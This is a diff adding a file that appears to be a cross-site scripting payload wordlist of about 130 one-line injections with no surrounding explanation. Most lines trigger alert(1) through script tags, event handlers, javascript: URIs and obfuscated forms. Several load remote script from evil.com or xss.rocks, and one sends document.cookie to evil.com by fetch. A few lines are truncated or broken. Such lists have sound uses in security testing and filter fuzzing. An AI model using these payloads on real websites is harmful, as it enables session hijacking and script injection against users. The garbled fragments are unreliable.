@@ -1,0 +1,131 @@
+<script>alert(1)</script>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<math><brute href=javascript:alert(1)>
+<img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script src=//xss.rocks/xss.js>
+<svg onload=confirm(1)>
+"><img src=x onerror=confirm(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<marquee onstart=alert(1)>
+<video><source onerror="alert(1)">
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<form action=javascript:alert(1)>
+<form><button formaction=javascript:alert(1)>
+"><script>eval('alert(1)')</script>
+"><script>eval(atob('YWxlcnQoMSk='))</script>
+"><script>top </script>
+"><script>top </script>
+<x onclick=alert(1)>click</x>
+<x onfocus=alert(1) tabindex=1>focus</x>
+<img src=x onerror=prompt(1)>
+<input onfocus=alert(1) autofocus>
+<a href="javascript:alert(1)">click</a>
+<img src='x' onerror='alert(1)//'>
+<script>self </script>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<script src=data:text/javascript,alert(1)>
+<math><a href=javascript:alert(1)>
+<svg><a xlink:href=javascript:alert(1)>
+<svg><animate attributeName="href" from="javascript:alert(1)">
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+"><svg/onload=alert(1)>
+"><script>alert(1)</script>
+<script>window.onerror=alert;throw "x"</script>
+<details open ontoggle=alert(1)>
+<select onchange=alert(1)><option>1<option>2
+<isindex action=javascript:alert(1)>
+<img src=x:alert(1)>
+<img src=1 href="javascript:alert(1)">
+<video src=1 onerror=alert(1)>
+<object data=javascript:alert(1)>
+<svg/onload=alert(document.domain)>
+<script>alert(document.cookie)</script>
+<script src="data:text/javascript,alert(1)">
+<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>
+<input type="image" src=x onerror=alert(1)>
+<iframe/onload=alert(1)>
+<img src="1" onerror="alert(1)">
+<body onresize=alert(1)>
+<body onscroll=alert(1)>
+<body onorientationchange=alert(1)>
+<body onhashchange=alert(1)>
+<svg onload=alert(String.fromCharCode(88,83,83))>
+<div onmouseover="alert(1)">hover</div>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<iframe src=//evil.com>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))
+<svg onload="this.href='javascript:alert(1)'">
+<script>alert(location)</script>
+<img src=x onerror=alert(document.domain)>
+<svg><script xlink:href=data:,alert(1) />
+<svg><animate attributeName="xlink:href" from="javascript:alert(1)">
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)>
+<script>this.alert(1)</script>
+<svg/onload=alert(1)//
+<svg/onload=confirm(1)>
+" autofocus onfocus=alert(1)
+<input onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<math><script>alert(1)</script></math>
+<body onload="alert('XSS')">
+<img src=x onerror=top >
+<body onmouseover=alert(1)>
+<svg onload=location='javascript:alert(1)'>
+<div style="background:url(javascript:alert(1))">
+<iframe srcdoc='<script>alert(1)</script>'>
+"><svg><script>alert(1)</script></svg>
+<!--<script>alert(1)</script>-->
+<marquee loop=1 width=0 onfinish=alert(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<math><mi xlink:href="javascript:alert(1)"></mi></math>
+<svg><foreignObject><body onload=alert(1)>
+<input type=image src=1 onerror=alert(1)>
+<svg><text><![CDATA[</text><script>alert(1)</script>]]></svg>
+<img src='x' onerror='eval("alert(1)")'>
+<svg><set attributeName=onmouseover to=alert(1) begin=0s />
+"><svg onload=eval(atob('YWxlcnQoMSk='))>
+<script/x>alert(1)</script>
+<script src="http://evil.com/evil.js">
+<!--<svg/onload=alert(1)>-->
+<!--<img src=x onerror=alert(1)>-->
+<input type="text" value="</script><script>alert(1)</script>">
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>">
+<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)">X</a></svg>
+<img src="data:image/png;base64,..." onerror="alert(1)">
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<svg/onload="var a=document.createElement('script');a.src='//evil.com';document.body.appendChild(a)">
+"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg onload=fetch('//evil.com/'+document.cookie)>
+<svg><script>alert`1`</script></svg>
+<body onerror=alert(1) onload=/>
+<script>Function("alert(1)")()</script>
+<svg><animateTransform attributeName="transform" type="translate" values="0 0;100 100" begin="0s" dur="1s" repeatCount="indefinite"/></svg>
+<svg><text id=x onfocus=alert(1) tabindex=1>test</text></svg>
+<input type="text" onfocus=alert(1) autofocus>
+<body onload="javascript:alert(1)">
+<input onmouseover="alert(1)" value="hover">
+<textarea onblur=alert(1)>test</textarea>
+<form onsubmit="alert(1)"><input type="submit">
+<input type="text" onfocus="alert(1)" autofocus>
+<script>eval(unescape('%61%6c%65%72%74(1)'))</script>
+<x contenteditable onfocus=alert(1)>focus</x>
+<!--><script>alert(1)</script>
+<iframe src="javascript:'<script>alert(1)</script>'">
+<svg><script><![CDATA[alert(1)]]></script></svg>
+<object onerror=alert(1)>
+<body style=filter:url(javascript:alert(1))>
+<svg><g onload=alert(1)></g></svg>
+<svg><script>//--><!]]>alert(1)</script></svg>
+<img src="1\" onerror=alert(1)>
+<svg><desc><img src=x onerror=alert(1)></desc></svg>
+<input type="hidden" name="xss" value='"><script>alert(1)</script>'>
+<iframe src=vbscript:msgbox("XSS")>
+
